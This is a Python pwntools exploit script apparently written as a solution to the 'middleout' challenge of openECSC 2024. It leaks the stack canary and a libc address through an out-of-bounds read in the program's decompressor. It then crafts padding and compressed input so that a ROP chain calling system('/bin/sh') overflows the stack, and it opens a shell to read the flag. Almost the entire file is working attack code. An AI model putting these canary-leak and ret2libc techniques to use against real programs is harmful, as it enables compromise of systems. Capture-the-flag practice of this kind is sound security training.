#!/usr/bin/env python3

from pwn import *

logging.disable()

filename = os.path.join(os.path.dirname(__file__), "middleout")
libc = ELF(os.path.join(os.path.dirname(__file__), "libc.so.6"))
exe = context.binary = ELF(args.EXE or filename, checksec=False)
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

HOST = os.environ.get("HOST", "middleout.challs.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 47009))

EXTRA_PADDING = True

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return process([exe.path] + argv, *a, **kw)
    else:
        return remote(HOST, PORT)

def do_exploit():
    # Reset libc base address
    libc.address = 0

    io = start()

    # Dummy compression to ensure stack contains garbage from nested functions (leaks)
    io.sendlineafter(b"Please select an option: ", b"1")
    io.sendline(b"AABBCCDDEE"*2)

    # Decompress vulnerability to read out of bounds
    io.sendlineafter(b"Please select an option: ", b"2")
    io.sendlineafter(b"Please enter the input string (hex format): ", b"280C4001") # Read length = 24, distance = 4736 (see helper)

    io.recvuntil(b"Output (hex)            : ")
    leak = io.recvline().decode().strip()
    leak = bytes.fromhex(leak)
    canary = u64(leak[:8])
    libc_leak = u64(leak[16:24])
    log.info(f"Canary: {hex(canary)}")
    log.info(f"Libc leak: {hex(libc_leak)}") # _IO_2_1_stdin_
    libc.address = libc_leak - libc.sym["_IO_2_1_stdout_"]
    log.info(f"Libc base: {hex(libc.address)}")
    log.info(f"system: {hex(libc.sym['system'])}")
    log.info(f"/bin/sh: {hex(next(libc.search(b'/bin/sh')))}")

    pop_rdi = libc.address + 0x000000000002a3e5 # 0x000000000002a3e5 : pop rdi ; ret
    ret =     libc.address + 0x0000000000029139 # 0x0000000000029139 : ret

    # Change parameters for easier compression (literals only, no matches)
    io.sendlineafter(b"Please select an option: ", b"3")
    io.sendlineafter(b"512): ", b"1") # window size
    io.sendlineafter(b"3): ", b"10000") # min match

    # With default L-tree:
    # AA will be compressed to 9 bits
    # 41 will be compressed to 8 bits
    # The buffer is 4096 until the canary
    # We need to fill 4096 bytes with as many 9 bits as possible
    # 4096 * 8 = 32768 bits
    # 3640 * 9 = 32760 bits
    # 32768 - 32760 = 8 bits left
    # This means using 3640 * 9 + 1 * 8 = 32768 bits, which leaves us with 4096 - 3640 - 8 = 448 bytes of free space for the payload

    # Now our payload should be sent in a decompressed form because it will be compressed
    # So we have to shuffle the tree until the decompressed payload is < 448 bytes

    extra_ret = p64(ret) if EXTRA_PADDING else b"" # For stack alignment

    payload = p64(canary) + b"A"*8 + extra_ret + p64(pop_rdi) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym["system"])

    # Shuffle tree until a decompressed payload is < 456 bytes

    for i in range(100):
        log.debug(f"Trying shuffle {i}")
        io.sendlineafter(b"Please select an option: ", b"4") # Shuffle
        io.sendlineafter(b"Please select an option: ", b"2") # Decompress
        io.sendlineafter(b"Please enter the input string (hex format): ", payload.hex().encode())
        res = io.recvuntil(b"1. Compress").decode()
        if "[Error]" in res:
            continue

        try:
            payload_size = int(res.split("Decompressed size       : ")[1].split(" bytes")[0])
        except Exception as e:
            # Sometimes stderr is flushed after stdout, so if there really was an error, we didn't handle it earlier, so we just handle it now
            continue

        if payload_size >= 456:
            continue

        # Try to decompress and compress and expect to get a compressed payload that starts with our payload
        decompressed_payload = res.split("Output (hex)            : ")[1].split("\n")[0]

        io.sendlineafter(b"Please select an option: ", b"1") # Compress
        io.sendlineafter(b"Please enter the input string (hex format): ", decompressed_payload.encode())

        io.recvuntil(b"Output (hex)            : ")
        compressed_payload = io.recvline().decode().strip().lower()

        if compressed_payload.startswith(payload.hex()):
            # Good, we found a short decompressed payload that compresses to our payload
            break
    else:
        log.warn("Failed to find decompressed payload. Re-run the exploit")
        return False

    log.info(f"Payload: {payload.hex()}")
    log.info(f"Compressed: {compressed_payload}")
    log.info(f"Decompressed: {decompressed_payload}")

    bit9 = None
    bit8 = None

    # Let's find new 9 and 8 bit values for our padding
    # If a byte when compressed is 9 bits, then 8 bytes of that byte will be 8 * 9 / 8 = 9 bytes compressed
    # If a byte when compressed is 8 bits, then 8 bytes of that byte will be 8 bytes compressed
    for i in range(0x100):
        log.debug(f"Trying debug {i}")
        io.sendlineafter(b"Please select an option: ", b"1") # Compress
        io.sendlineafter(b"Please enter the input string (hex format): ", bytes([i]*8).hex().encode()) # Compress 8 bytes of the same value
        res = io.recvuntil(b"1. Compress")
        if b"[Error]" in res:
            continue

        compressed_size = int(res.decode().split("Compressed size         : ")[1].split(" bytes")[0])
        if compressed_size == 9 and bit9 is None:
            bit9 = i
        elif compressed_size == 8 and bit8 is None:
            bit8 = i

        if bit9 is not None and bit8 is not None:
            break
    else:
        log.warn("Failed to find suitable bytes. Re-run the exploit")
        return False

    # Buffer size is 4096 * 8 = 32768 bits
    # Padding compressed = 3640 * 9 + 8 = 32768 bits
    # Padding decompressed = 3640 * 8 + 8 = 29128 bits
    padding = bytes([bit9])*3640 + bytes([bit8])

    io.sendlineafter(b"Please select an option: ", b"1")
    io.sendlineafter(b"Please enter the input string (hex format): ", padding.hex().encode() + decompressed_payload.encode())

    io.recvuntil(b"==============================================")
    io.recvline()

    io.sendline(b"cat flag")
    res = io.recvuntil(b"openECSC{").strip()
    print('openECSC{' + io.recvuntil(b'}').strip().decode())
    io.close()
    return True

while not do_exploit():
    pass
